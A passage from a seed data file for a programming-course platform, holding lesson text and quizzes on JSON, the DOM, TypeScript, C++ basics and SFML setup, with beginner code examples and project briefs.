      `Since JSON is just text, JavaScript needs two built-in functions to move between "JSON as a string" and "JSON as real JavaScript values": \`JSON.parse\` and \`JSON.stringify\`.\n\n\`\`\`js\nconst jsonText = '{"title":"Modern JavaScript","lessons":6,"tags":["js","dom"]}';\n\nconst course = JSON.parse(jsonText);\nconsole.log(course.title);\nconsole.log(course.tags[1]);\n\nconst backToText = JSON.stringify(course);\nconsole.log(backToText);\n\nconst pretty = JSON.stringify(course, null, 2);\nconsole.log(pretty);\n\`\`\`\n\n## Reading it\n\n- \`JSON.parse(text)\` turns a JSON string into real JavaScript values (objects, arrays, numbers, ...), throws a \`SyntaxError\` if the text isn't valid JSON.\n- \`JSON.stringify(value)\` turns a JavaScript value into a JSON string.\n- The third argument to \`stringify\`, here \`2\`, adds indentation, handy for logging or writing readable files, it has no effect on parsing.\n- Anything \`JSON.stringify\` can't represent, functions, \`undefined\` values, gets silently dropped from objects (or turned into \`null\` inside arrays).\n\n\`\`\`js\nconst withExtras = { name: 'Ada', greet: () => 'hi', missing: undefined, count: 3 };\nconsole.log(JSON.stringify(withExtras)); // greet and missing both disappear\n\`\`\``
    ),
    quiz: {
      title: 'Parse & Stringify Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which function converts a JSON string into a JavaScript value?',
          options: ['JSON.stringify', 'JSON.parse', 'JSON.encode', 'JSON.toObject'],
          answer: 'JSON.parse',
        },
        {
          type: 'FILL_BLANK',
          prompt: "Calling JSON.parse on text that isn't valid JSON throws a ____.",
          options: [],
          answer: 'SyntaxError',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'JSON.stringify keeps function properties in the resulting string.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Selecting and Reading the DOM',
    content: lessonContent(
      'Selecting and Reading the DOM',
      `Before you can change a page with JavaScript, you need to find the elements you want to change. \`document.querySelector\` and \`document.querySelectorAll\` use the same selector syntax as CSS.\n\n\`\`\`\nconst heading = document.querySelector('h1');\nconsole.log(heading.textContent);\n\nconst allCards = document.querySelectorAll('.card');\nconsole.log(allCards.length);\n\nallCards.forEach(function (card) {\n  console.log(card.getAttribute('data-id'));\n});\n\`\`\`\n\n*This needs a real web page to query, so this block is read-only here, you'll get hands-on DOM practice in the final project.*\n\n## Reading it\n\n- \`querySelector(selector)\` returns the **first** matching element, or \`null\` if nothing matches.\n- \`querySelectorAll(selector)\` returns a static list (a \`NodeList\`) of **every** matching element, it has \`.forEach\`, but isn't a real array.\n- \`.textContent\` reads (or sets) an element's text, ignoring any HTML tags inside it.\n- \`.getAttribute(name)\` reads an HTML attribute's raw string value, e.g. \`data-id\`, \`href\`, \`src\`.`
    ),
    quiz: {
      title: 'DOM Selection Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does document.querySelector('.card') return if no element matches?",
          options: ['An empty array', 'undefined', 'null', 'Throws an error'],
          answer: 'null',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'querySelectorAll returns a real Array with methods like map and filter.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: "element.____ reads or sets an element's visible text, ignoring HTML tags inside it.",
          options: [],
          answer: 'textContent',
        },
      ],
    },
  },
  {
    title: 'Creating and Updating DOM Elements',
    content: lessonContent(
      'Creating and Updating DOM Elements',
      `Reading the DOM only gets you so far, real interactivity means creating, modifying, and removing elements as your data changes.\n\n\`\`\`\nconst list = document.querySelector('#tasks');\n\nconst item = document.createElement('li');\nitem.textContent = 'Learn the DOM';\nitem.classList.add('task');\nitem.dataset.done = 'false';\n\nlist.append(item);\n\nitem.classList.toggle('done');\nitem.remove();\n\`\`\`\n\n*Like the previous lesson, this needs a real page with a #tasks list, so it's read-only here.*\n\n## Reading it\n\n- \`document.createElement(tag)\` creates a new, detached element, it doesn't appear on the page until you attach it.\n- \`.append(node)\` (or the older \`.appendChild(node)\`) inserts a node as the last child of another element.\n- \`.classList.add\`/\`.remove\`/\`.toggle\` manage CSS classes without you having to fiddle with the raw \`className\` string.\n- \`.dataset.done\` reads or writes a \`data-done\` attribute, a clean way to stash small bits of state directly on an element.\n- \`.remove()\` deletes the element from the page entirely.`
    ),
    quiz: {
      title: 'DOM Editing Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which method creates a brand-new, detached DOM element?',
          options: ['document.append()', 'document.createElement()', 'document.newElement()', 'Element.clone()'],
          answer: 'document.createElement()',
        },
        {
          type: 'FILL_BLANK',
          prompt: "element.classList.____('done') flips a CSS class on and off.",
          options: [],
          answer: 'toggle',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A newly created element is automatically visible on the page as soon as it is created.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Rendering JSON Data into the DOM',
    content: lessonContent(
      'Rendering JSON Data into the DOM',
      `JSON and the DOM meet constantly in real apps: you get data as JSON (from an API, a file, \`localStorage\`), and your job is to turn each item into visible elements.\n\n\`\`\`\nconst productsJson = '[{"id":1,"name":"Keyboard","price":49},{"id":2,"name":"Mouse","price":19}]';\nconst products = JSON.parse(productsJson);\n\nconst list = document.querySelector('#products');\nlist.innerHTML = ''; // clear any placeholder content\n\nproducts.forEach(function (product) {\n  const item = document.createElement('li');\n  item.textContent = product.name + ' — $' + product.price;\n  item.dataset.id = String(product.id);\n  list.append(item);\n});\n\`\`\`\n\n*Needs a real #products element, so it's read-only here, you'll build the runnable version in the final project.*\n\n## The pattern\n\n1. Get JSON (parsed from text, or from \`await res.json()\` after a \`fetch\`).\n2. Loop over the parsed array with \`.forEach\`/\`.map\`.\n3. For each item, \`createElement\`, set its content and attributes from that item's properties, then \`append\` it.\n4. Clear a container first (\`list.innerHTML = ''\`) so re-rendering doesn't duplicate elements.\n\nThis same loop is how every JSON-driven UI works, a to-do list, a product grid, a chat log, only the shape of the JSON and the elements you create change.`
    ),
    quiz: {
      title: 'JSON-to-DOM Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the first step when turning a JSON array into DOM elements?',
          options: [
            'Call JSON.stringify on the DOM',
            'Parse the JSON into real JavaScript values',
            'Attach event listeners',
            'Delete the container element',
          ],
          answer: 'Parse the JSON into real JavaScript values',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Setting list.innerHTML = '' before re-rendering helps avoid duplicate elements on a second render.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Looping over a parsed array and calling document.____ for each item is how you build DOM elements from JSON.',
          options: [],
          answer: 'createElement',
        },
      ],
    },
  },
  {
    title: 'Final Project: JSON Product Catalog',
    content: lessonContent(
      'Final Project: JSON Product Catalog',
      `Time to combine everything: parsing JSON, building DOM elements, and keeping data in sync with what's on the page.\n\n## Requirements\n\n1. Start from a JSON array of at least 6 products, each with \`id\`, \`name\`, \`price\`, and \`inStock\`.\n2. Render every product as a card in the DOM (name, price, and an in/out of stock badge) using \`createElement\`, not by writing raw HTML strings.\n3. Add a search input that filters the rendered cards as the user types, matching on product name.\n4. Let the user toggle a product's \`inStock\` state by clicking a button on its card.\n5. Persist the current product list to \`localStorage\` as JSON every time it changes, using \`JSON.stringify\`, and load it back with \`JSON.parse\` on page load if it's there.\n\n## Stretch goals\n\n- Add a form to add a brand-new product.\n- Sort products by price, ascending or descending.\n- Show a running count of how many products are currently in stock.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const tsLessons: SeedLesson[] = [
  {
    title: 'Why TypeScript?',
    content: lessonContent(
      'Why TypeScript?',
      `TypeScript adds **static types** on top of JavaScript, the compiler checks that your code is internally consistent *before* it ever runs, catching whole categories of bugs that would otherwise only show up at runtime, in production, in front of a user.\n\n\`\`\`ts\nfunction greet(name: string): string {\n  return \`Hello, \${name}\`;\n}\n\nconsole.log(greet('Kodstigen'));\n\n// greet(42) ❌ the compiler rejects this before the code ever runs:\n// "Argument of type 'number' is not assignable to parameter of type 'string'"\n\`\`\`\n\n## What changed from JavaScript\n\n- \`name: string\` declares that the \`name\` parameter must be a string, pass anything else and the compiler stops you immediately, instead of the bug surfacing later as a confusing runtime error.\n- \`): string\` after the parameter list declares the function's **return type**, if the function body tried to \`return 42\` instead, that would be a compile error too.\n- Every valid JavaScript program is already valid TypeScript, you can add types gradually, file by file, instead of rewriting everything at once.\n\n## Compile time vs. runtime\n\nTypeScript types only exist while you're writing and compiling code, they're checked once, then stripped away entirely. The JavaScript that actually runs in a browser or Node.js has no idea types ever existed, this is why TypeScript can catch bugs early without slowing down the program itself.\n\n*Note: the playground runs TypeScript by stripping the types, full type checking happens in your editor and compiler.*`
    ),
    quiz: {
      title: 'TypeScript Intro Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'TRUE_FALSE',
          prompt: 'TypeScript types are checked at compile time, not at runtime.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'TypeScript files typically use the file extension .____',
          options: [],
          answer: 'ts',
        },
      ],
    },
  },
  {
    title: 'Interfaces and Types',
    content: lessonContent(
      'Interfaces and Types',
      `As programs grow, describing the *shape* of your data becomes just as important as describing its logic. TypeScript gives you two main tools for that: **interfaces** and **type aliases**.\n\n\`\`\`ts\ninterface Course {\n  id: string;\n  title: string;\n  lessons: number;\n  published?: boolean; // optional\n}\n\ntype Role = 'STUDENT' | 'INSTRUCTOR' | 'ADMIN'; // union type\n\nfunction describe(course: Course, role: Role): string {\n  return \`\${role} viewing "\${course.title}" (\${course.lessons} lessons)\`;\n}\n\nconsole.log(describe({ id: 'c1', title: 'TypeScript from JavaScript', lessons: 12 }, 'STUDENT'));\n\`\`\`\n\n## Interfaces describe object shapes\n\n\`interface Course { ... }\` says: "a \`Course\` is an object with exactly these properties." Passing an object missing \`title\`, or with a \`lessons\` that's a string instead of a number, is a compile error. The \`?\` after \`published\` marks it **optional**, an object can be a valid \`Course\` with or without it.\n\n## Union types restrict the possible values\n\n\`type Role = 'STUDENT' | 'INSTRUCTOR' | 'ADMIN';\` means a \`Role\` can only ever be one of those three exact strings, nothing else. Try passing \`'ADMINISTRATOR'\` where a \`Role\` is expected, and the compiler catches the typo immediately, something plain JavaScript could never do.\n\n> [!NOTE]\n> \`interface\` and \`type\` overlap a lot in practice, a common convention is: use \`interface\` for the shape of objects, and \`type\` for unions, primitives, or anything an interface can't express.`
    ),
    quiz: {
      title: 'Types Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does the ? in `published?: boolean` mean?",
          options: ['The property is nullable', 'The property is optional', 'The property is readonly', 'The property is private'],
          answer: 'The property is optional',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Which symbol combines types into a union?",
          options: ['&', '|', '+', '::'],
          answer: '|',
        },
      ],
    },
  },
  {
    title: 'Generics',
    content: lessonContent(
      'Generics',
      `**Generics** let you write a function or type once and have it work correctly with whatever type gets passed in, without losing type safety.\n\n\`\`\`ts\nfunction firstElement<T>(items: T[]): T | undefined {\n  return items[0];\n}\n\nconsole.log(firstElement([1, 2, 3]));        // inferred as number | undefined\nconsole.log(firstElement(['a', 'b', 'c']));   // inferred as string | undefined\n\ninterface Box<T> {\n  value: T;\n}\n\nconst numberBox: Box<number> = { value: 42 };\nconsole.log(numberBox.value);\n\`\`\`\n\nThink of \`<T>\` as a placeholder: "whatever type you give me, I'll give the same type back out." The compiler figures out \`T\` automatically from the argument you pass, and still catches mistakes, \`firstElement([1, 2, 3])[0].toUpperCase()\` would be a compile error because that element is a \`number\`, not a \`string\`.`
    ),
    quiz: {
      title: 'Generics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'A generic type parameter is conventionally named a single capital letter, most commonly ____.',
          options: [],
          answer: 'T',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main benefit of using generics?',
          options: [
            'They disable type checking for flexibility',
            'They let you reuse code across types while staying type-safe',
            'They convert all types to any',
            'They are only usable with arrays',
          ],
          answer: 'They let you reuse code across types while staying type-safe',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'firstElement<string>(...) and firstElement<number>(...) can share the exact same function implementation.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Enums and Advanced Types',
    content: lessonContent(
      'Enums and Advanced Types',
      `## Enums\n\nAn \`enum\` gives a set of related constants readable names.\n\n\`\`\`ts\nenum Role {\n  Student = 'STUDENT',\n  Instructor = 'INSTRUCTOR',\n  Admin = 'ADMIN',\n}\n\nfunction permissions(role: Role): string[] {\n  switch (role) {\n    case Role.Admin:\n      return ['read', 'write', 'delete'];\n    case Role.Instructor:\n      return ['read', 'write'];\n    default:\n      return ['read'];\n  }\n}\n\nconsole.log(permissions(Role.Instructor));\n\`\`\`\n\n## Discriminated unions\n\nCombining a union type with a shared \"tag\" property lets TypeScript narrow which shape you're working with.\n\n\`\`\`ts\ntype ApiResult<T> = { ok: true; data: T } | { ok: false; error: string };\n\nfunction unwrap<T>(result: ApiResult<T>): T {\n  if (!result.ok) throw new Error(result.error);\n  return result.data; // TypeScript knows result is the { ok: true } branch here\n}\n\nconsole.log(unwrap({ ok: true, data: 42 }));\n\`\`\`\n\nThe \`ok\` property is the discriminant, checking it narrows \`result\` to exactly one branch of the union inside each \`if\`.`
    ),
    quiz: {
      title: 'Enums & Unions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What kind of type is `{ ok: true; data: T } | { ok: false; error: string }`?',
          options: ['A generic constraint', 'A discriminated union', 'An enum', 'An intersection type'],
          answer: 'A discriminated union',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to define a set of named constants in TypeScript is ____.',
          options: [],
          answer: 'enum',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Checking a shared property like `result.ok` lets TypeScript narrow the type inside an if branch.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Classes and Access Modifiers',
    content: lessonContent(
      'Classes and Access Modifiers',
      `TypeScript classes add access modifiers on top of JavaScript classes to enforce encapsulation at compile time.\n\n\`\`\`ts\nclass Account {\n  private balance: number;\n  readonly owner: string;\n\n  constructor(owner: string, startingBalance = 0) {\n    this.owner = owner;\n    this.balance = startingBalance;\n  }\n\n  deposit(amount: number): number {\n    this.balance += amount;\n    return this.balance;\n  }\n\n  getBalance(): number {\n    return this.balance;\n  }\n}\n\nconst acct = new Account('Ada', 100);\nacct.deposit(50);\nconsole.log(acct.owner, acct.getBalance());\n\n// acct.balance ❌ the compiler rejects this before the code ever runs:\n// "Property 'balance' is private and only accessible within class 'Account'"\n\`\`\`\n\n## Modifiers\n\n| Modifier | Meaning |\n|----------|---------|\n| \`public\` (default) | Accessible from anywhere |\n| \`private\` | Only accessible inside the class itself |\n| \`readonly\` | Can be set once (usually in the constructor), never reassigned after |`
    ),
    quiz: {
      title: 'Classes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does marking a field `private` do?',
          options: [
            'Makes it read-only',
            'Prevents it from being accessed outside the class',
            'Makes it optional',
            'Turns it into a generic',
          ],
          answer: 'Prevents it from being accessed outside the class',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A field marked ____ can be set once but never reassigned afterward.',
          options: [],
          answer: 'readonly',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'By default, class fields in TypeScript are public.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Typed Task Tracker',
    content: lessonContent(
      'Final Project: Typed Task Tracker',
      `Time to combine interfaces, generics, unions, and classes into one typed program.\n\n## Requirements\n\n1. Define an interface (or type) describing a \`Task\`: \`id\`, \`title\`, \`done\`, and \`priority: 'low' | 'medium' | 'high'\`.\n2. Write a generic \`Store<T>\` class (or a set of typed functions) that can add, remove, and list items of any type, then use it to manage \`Task\` objects.\n3. Write a function that filters tasks by priority and returns a properly typed result.\n4. Model an "add task" operation as a discriminated union or use an \`enum\` somewhere meaningful, e.g. a result type that can succeed or fail validation.\n5. Make sure the whole file compiles with no implicit \`any\`s, add explicit types anywhere inference doesn't cover you.\n\n## Stretch goals\n\n- Sort tasks by priority.\n- Add a \`readonly createdAt\` field set in the constructor.\n- Split your types into a separate file and import them with \`import\`/\`export\`.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const cppLessons: SeedLesson[] = [
  {
    title: 'Hello, C++',
    content: lessonContent(
      'Hello, C++',
      `C++ is a **compiled**, statically-typed language, your source code is translated into machine code by a compiler before the program ever runs. That extra step is part of why C++ programs run so fast, and why "compile errors" catch many mistakes before you even try running anything. It's used everywhere performance matters: games and game engines, operating systems, embedded devices, and other high-performance software.\n\n## Your first program\n\n\`\`\`cpp\n#include <iostream>\n\nint main() {\n    std::cout << "Hello, Kodstigen!" << std::endl;\n    return 0;\n}\n\`\`\`\n\n## Reading it line by line\n\n- \`#include <iostream>\` pulls in the input/output library, without it \`std::cout\` wouldn't exist.\n- \`int main() { ... }\` is the **entry point**, every C++ program starts running here, and only here.\n- \`std::cout << "..."\` sends text to the console, \`std::\` means "this comes from the standard library", and \`<<\` pushes a value into the output stream.\n- \`std::endl\` ends the current line.\n- \`return 0;\` tells the operating system the program finished successfully, by convention \`0\` means "no errors" (anything else signals a problem).\n\n## Compiling and running\n\nUnlike Python or JavaScript, C++ code doesn't run directly, a compiler translates it into an executable first:\n\n\`\`\`bash\ng++ hello.cpp -o hello\n./hello\n\`\`\`\n\n\`g++ hello.cpp -o hello\` compiles \`hello.cpp\` into a program named \`hello\`, \`./hello\` then runs it.`
    ),
    quiz: {
      title: 'C++ Intro Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which function is the entry point of every C++ program?',
          options: ['start()', 'main()', 'init()', 'run()'],
          answer: 'main()',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'C++ source code must be compiled before it can run.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Variables and Memory',
    content: lessonContent(
      'Variables and Memory',
      `Every variable lives somewhere in your computer's memory, and C++ is unusual among popular languages in letting you work with that memory directly.\n\n## Declaring variables\n\n\`\`\`cpp\nint xp = 100;         // an integer variable holding the value 100\ndouble price = 9.99;  // a floating-point number\nchar grade = 'A';     // a single character\nbool passed = true;   // true or false\n\`\`\`\n\nEvery variable in C++ has a fixed **type** decided when it's declared, an \`int\` can never later hold a decimal or a piece of text.\n\n## Addresses, pointers, and references\n\nEvery variable lives at a specific **address** in memory, think of memory as a huge street of numbered houses, a variable's address is just its house number.\n\n\`\`\`cpp\nint xp = 100;\nstd::cout << &xp;      // prints xp's address, e.g. 0x7ffc3a2b1c\n\nint* ptr = &xp;        // ptr is a pointer: it stores xp's address\nstd::cout << *ptr;     // *ptr "dereferences" ptr: prints 100, the value at that address\n\nint& ref = xp;         // ref is a reference: another name for xp itself\nref = 200;             // this actually changes xp too!\nstd::cout << xp;       // prints 200\n\`\`\`\n\n| Symbol | Meaning | Example |\n|---|---|---|\n| \`&x\` | "address of x" | \`int* p = &x;\` |\n| \`*p\` | "the value at the address p points to" | \`std::cout << *p;\` |\n| \`T*\` | "a pointer to a T" | \`int* p;\` |\n| \`T&\` | "a reference to a T" | \`int& r = x;\` |\n\n## Pointers vs. references\n\n- A **pointer** is a variable that stores an address, it can be reassigned to point somewhere else, or set to \`nullptr\` to point at nothing at all.\n- A **reference** is an alias for an existing variable, it must be bound to something when it's created, and can never be changed to refer to something else afterward.\n\n> [!WARNING]\n> A pointer that still holds the address of something that's already been destroyed is called a **dangling pointer**, dereferencing it is undefined behavior, one of the most common sources of bugs in C++. Always be sure what a pointer points at is still alive before you dereference it.`
    ),
    quiz: {
      title: 'Memory Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'The operator used to get the address of a variable is ____.',
          options: [],
          answer: '&',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does dereferencing a pointer (*ptr) give you?',
          options: ['The address it stores', 'The value at the address it stores', 'A copy of the pointer', 'A compile error'],
          answer: 'The value at the address it stores',
        },
      ],
    },
  },
  {
    title: 'Control Flow and Loops',
    content: lessonContent(
      'Control Flow and Loops',
      `Programs need to make decisions and repeat work. C++'s control-flow keywords work a lot like other C-family languages (JavaScript, C#, Java), so what you learn here will transfer directly.\n\n\`\`\`cpp\n#include <iostream>\n\nint main() {\n    int xp = 45;\n\n    if (xp >= 50) {\n        std::cout << "Level up!" << std::endl;\n    } else {\n        std::cout << "Keep going, " << (50 - xp) << " XP to go." << std::endl;\n    }\n\n    for (int i = 1; i <= 5; i++) {\n        std::cout << "Lesson " << i << std::endl;\n    }\n\n    int count = 0;\n    while (count < 3) {\n        std::cout << "count = " << count << std::endl;\n        count++;\n    }\n\n    return 0;\n}\n\`\`\`\n\n## The pieces\n\n- \`if\` / \`else\` branches on a boolean condition, the condition must always be wrapped in parentheses.\n- \`for (init; condition; increment)\` runs the init once, then repeats: check condition, run the loop body, run the increment, check condition again, and so on. Best when you know how many times to loop.\n- \`while (condition)\` keeps looping as long as the condition stays true, checked before every iteration, useful when you don't know the number of iterations ahead of time.\n\n> [!TIP]\n> Forgetting to update the loop variable (like \`count++\`) is one of the most common beginner bugs, it creates an **infinite loop** that never becomes false.`
    ),
    quiz: {
      title: 'Control Flow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which loop is the best fit when you know exactly how many iterations you need?',
          options: ['for', 'while', 'do', 'if'],
          answer: 'for',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A while loop whose condition never becomes false is called an ____ loop.',
          options: [],
          answer: 'infinite',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "In C++, the condition in an if statement must be wrapped in parentheses.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Functions',
    content: lessonContent(
      'Functions',
      `A **function** packages up a piece of logic so you can reuse it by name, instead of retyping the same code everywhere.\n\n\`\`\`cpp\n#include <iostream>\n#include <string>\n\nint add(int a, int b) {\n    return a + b;\n}\n\nvoid greet(const std::string& name) {\n    std::cout << "Hello, " << name << "!" << std::endl;\n}\n\nint main() {\n    std::cout << "add(2, 3) = " << add(2, 3) << std::endl;\n    greet("Kodstigen");\n    return 0;\n}\n\`\`\`\n\n## Key ideas\n\n- A function's declared return type (\`int\`, \`void\`, ...) must match what it actually returns, \`void\` means "returns nothing".\n- In \`add(int a, int b)\`, \`a\` and \`b\` are **parameters**, placeholders for whatever values get passed in when the function is called (the actual values, like \`2\` and \`3\`, are called **arguments**).\n- Passing a parameter as \`const std::string&\` passes it **by reference** instead of copying it, faster for large objects like strings, and \`const\` promises the function won't modify it.\n- Functions must generally be declared (or defined) before they're used, that's why \`add\` and \`greet\` appear above \`main\`.`
    ),
    quiz: {
      title: 'Functions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a function declared with return type `void` return?',
          options: ['Nothing', 'Zero', 'A null pointer', 'An empty string'],
          answer: 'Nothing',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Declaring a parameter as `const std::string&` avoids copying the argument by passing it by ____.',
          options: [],
          answer: 'reference',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A function's return type must match the type of value it actually returns.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Arrays and Vectors',
    content: lessonContent(
      'Arrays and Vectors',
      `Most programs need to work with collections of values, not just single variables. C++ gives you two main options: fixed-size arrays and resizable vectors.\n\n\`\`\`cpp\n#include <iostream>\n#include <vector>\n\nint main() {\n    int scores[3] = {80, 92, 67};   // fixed-size array\n    std::cout << "first score: " << scores[0] << std::endl;\n\n    std::vector<int> xp = {10, 20, 30};   // resizable array\n    xp.push_back(40);\n\n    int total = 0;\n    for (int value : xp) {\n        total += value;\n    }\n    std::cout << "total xp: " << total << std::endl;\n    std::cout << "vector size: " << xp.size() << std::endl;\n\n    return 0;\n}\n\`\`\`\n\n## Arrays vs. vectors\n\n- A plain array (\`int scores[3]\`) has a **fixed size** decided at compile time, it can never grow or shrink, and accessing an out-of-bounds index (like \`scores[5]\`) is undefined behavior, C++ won't stop you.\n- \`std::vector<T>\`, part of the Standard Template Library (STL), is a **resizable** array, \`push_back\` adds an element, \`size()\` tells you how many there are.\n- The range-based \`for (int value : xp)\` loop visits every element without needing an index, read it as "for each value in xp".\n\n> [!TIP]\n> When you're not sure how many elements you'll need, reach for \`std::vector\` by default, plain arrays are mostly useful when the size is small and fixed ahead of time.`
    ),
    quiz: {
      title: 'Arrays & Vectors Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main advantage of std::vector over a plain fixed-size array?',
          options: [
            'It uses less memory always',
            'It can grow and shrink at runtime',
            'It is faster to access by index',
            'It cannot store integers',
          ],
          answer: 'It can grow and shrink at runtime',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The method used to add an element to the end of a vector is ____().',
          options: [],
          answer: 'push_back',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An array declared as `int scores[3]` can change size after it is created.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Grade Calculator',
    content: lessonContent(
      'Final Project: Grade Calculator',
      `Time to combine control flow, functions, and vectors into one program.\n\n## Requirements\n\n1. Store a list of student scores using a \`std::vector<int>\`.\n2. Write a function that computes the average of the scores.\n3. Write a function that returns the highest and lowest score.\n4. Loop over the scores and print each one alongside a letter grade (A/B/C/D/F) based on thresholds you define.\n5. Print a final summary of the average, highest, and lowest scores using \`std::cout\`.\n\n## Stretch goals\n\n- Read scores from the user with \`std::cin\` instead of hardcoding them.\n- Use a \`struct\` to bundle a student's name together with their scores.\n- Split the logic into multiple small functions, each with one clear responsibility.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const sfmlBreakoutLessons: SeedLesson[] = [
  {
    title: 'SFML: Setup and Installation',
    content: lessonContent(
      'SFML: Setup and Installation',
      `**SFML** (Simple and Fast Multimedia Library) is C++'s most popular library for 2D graphics, windows, input, and audio, think of it as C++'s answer to Python's Pygame. It handles opening a window and drawing shapes so you can focus on game logic instead of low-level graphics APIs.\n\n## Installing SFML\n\n- **Ubuntu/Debian**: \`sudo apt install libsfml-dev\`\n- **macOS (Homebrew)**: \`brew install sfml\`\n- **Windows**: install via \`vcpkg install sfml\`, or download prebuilt binaries from the SFML website and point your IDE at them.\n\n## Compiling with SFML\n\nSFML is split into modules, a game needs at least \`graphics\`, \`window\`, and \`system\`:\n\n\`\`\`bash\ng++ main.cpp -o breakout -lsfml-graphics -lsfml-window -lsfml-system\n./breakout\n\`\`\`\n\n## Opening a window\n\n\`\`\`cpp\n#include <SFML/Graphics.hpp>\n\nint main() {\n    sf::RenderWindow window(sf::VideoMode(800, 600), "Breakout");\n\n    while (window.isOpen()) {\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed) {\n                window.close();\n            }\n        }\n\n        window.clear(sf::Color::Black);\n        window.display();\n    }\n\n    return 0;\n}\n\`\`\`\n\n## Reading it line by line\n\n- \`sf::RenderWindow window(sf::VideoMode(800, 600), "Breakout")\` creates an 800x600 window titled "Breakout".\n- The outer \`while (window.isOpen())\` is the **game loop**, it keeps running every frame until the window closes.\n- The inner \`while (window.pollEvent(event))\` drains every pending event (key presses, window close, etc.) this frame, \`sf::Event::Closed\` fires when the user clicks the close button.\n- \`window.clear(...)\` wipes the previous frame, and \`window.display()\` swaps the finished frame onto the screen, without both of these you'd see nothing, or a smeared trail of every frame ever drawn.\n\n> [!TIP]\n> Forgetting \`window.pollEvent(event)\` entirely makes the window freeze and appear "Not Responding", the OS needs your program to keep handling events even if you don't care about most of them.`
    ),
    quiz: {
      title: 'SFML Setup Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does SFML stand for?',
          options: [
            'Simple and Fast Multimedia Library',
            'Standard Framework for Modern Languages',
            'System Function Mapping Layer',
            'Structured File Management Library',
          ],
          answer: 'Simple and Fast Multimedia Library',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You must call both window.clear() and window.display() every frame to see a stable image.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'The Game Loop',
    content: lessonContent(
      'The Game Loop',
